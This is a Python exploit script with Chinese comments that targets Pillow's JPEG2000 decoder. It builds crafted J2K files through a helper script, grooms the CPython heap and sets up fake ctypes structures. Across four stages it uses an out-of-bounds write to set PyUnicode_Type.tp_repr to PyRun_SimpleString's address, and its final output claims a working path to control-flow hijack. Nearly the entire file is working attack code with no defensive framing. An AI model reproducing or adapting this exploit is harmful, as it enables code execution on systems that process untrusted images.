#!/usr/bin/env python3
# 终局 v4：
#   · staging 用 bytearray，并【全程持有 ctypes 视图引用】（否则 GC 时 free 出错）
#   · 每段一次子进程（编码+构建合一）=> groom 前堆相位恒定
#   · 四段把 0x00451a9c 写进 PyUnicode_Type.tp_repr
import ctypes, gc, io, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TP_REPR = 0xA3C908
VAL = 0x00451A9C
PAY = '/tmp/pl.j2k'
BUILT = '/tmp/blt.j2k'

HOLD = []          # ★ 持有所有 ctypes 视图，防止 GC 误 free


def low_buffer(n, want_low=True):
    for _ in range(64):
        b = bytearray(n)
        view = (ctypes.c_char * n).from_buffer(b)
        HOLD.append((b, view))                 # ★ 引用保活
        a = ctypes.addressof(view)
        if (not want_low) or a < 0x1000000:
            return b, a
    raise RuntimeError('no low buffer')


RES_O, RESADDR = low_buffer(4096)
FAKE_O, FAKE = low_buffer(4096)
print("[*] RES=%#x FAKE=%#x" % (RESADDR, FAKE))


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def put32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


def make_fake(target):
    put64(FAKE + 0x10, 1)
    put64(FAKE + 0x18, 1)
    put64(FAKE + 0x20, RESADDR)
    put64(FAKE + 0x28, 40)
    put64(FAKE + 0x30, target)          # ★ data
    put64(FAKE + 0x38, 0)
    put64(FAKE + 0x40, 4096)
    put64(FAKE + 0x48, 4096)
    put64(FAKE + 0x70, 256)
    put32(RESADDR + 0x08, 16)
    put32(RESADDR + 0x0c, 16)
    put32(RESADDR + 0x10, 1)
    put32(RESADDR + 0x14, 1)
    return FAKE


def one_subproc(byte_val, A, B, C):
    code = (
        "import subprocess, sys\n"
        "from PIL import Image\n"
        "im = Image.new('L', (16, 16))\n"
        "im.putdata([%d] + [0]*255)\n"
        "im.save(%r, 'JPEG2000', tile_size=(8, 8), num_resolutions=4)\n"
        "r = subprocess.run(['python3', '/tmp/mk13.py', %r, %r, '0', '23', %r, %r, %r, '-370'],\n"
        "                   capture_output=True, text=True)\n"
        "sys.stdout.write(r.stdout)\n"
        % (byte_val, PAY, PAY, BUILT, hex(A), hex(B), hex(C)))
    r = subprocess.run([sys.executable, '-c', code], capture_output=True, text=True)
    return (r.stdout or '') .strip() or (r.stderr or '')[:70]


def groom_and_decode(path, tries=6):
    for _ in range(tries):
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
        if not good:
            del pairs
            continue
        ng = len(good)
        keep = [t for i, t in enumerate(good) if i != len(good) // 2]
        Ks = [B for (D, B) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        M = open(path, 'rb').read()
        try:
            im = Image.open(io.BytesIO(M)); im.load()
            return (im.size, ng)
        except BaseException as e:
            return ("ERR %r" % (e,), ng)
    return (None, 0)


print("[*] tp_repr 原值 = %#x   目标 = %#x" % (R(TP_REPR), VAL))

for stage in range(4):
    byte_val = (VAL >> (8 * stage)) & 0xFF
    make_fake(TP_REPR + stage)
    A = FAKE - 0x0c
    B = A + 0x1000
    C = A + 0x4000
    out = one_subproc(byte_val, A, B, C)
    if 'OK' not in out:
        print("段%d build 失败: %s" % (stage + 1, out)); sys.exit(1)
    res, ng = groom_and_decode(BUILT)
    print("[*] 段%d (byte=%#x): data=%#x 解码=%s 相邻对=%d  tp_repr=%#x"
          % (stage + 1, byte_val, TP_REPR + stage, res, ng, R(TP_REPR)))

final = R(TP_REPR)
print()
print("[*] 最终 tp_repr = %#x   期望 = %#x" % (final, VAL))
if (final & 0xFFFFFFFF) == VAL:
    print("\n★★★ 连续 32 位值写入成立：PyUnicode_Type.tp_repr = 0x451a9c (PyRun_SimpleString)")
    print("    => 多段拼装 ⇒ 任意字段/任意值 ⇒ 控制流改写入口打通")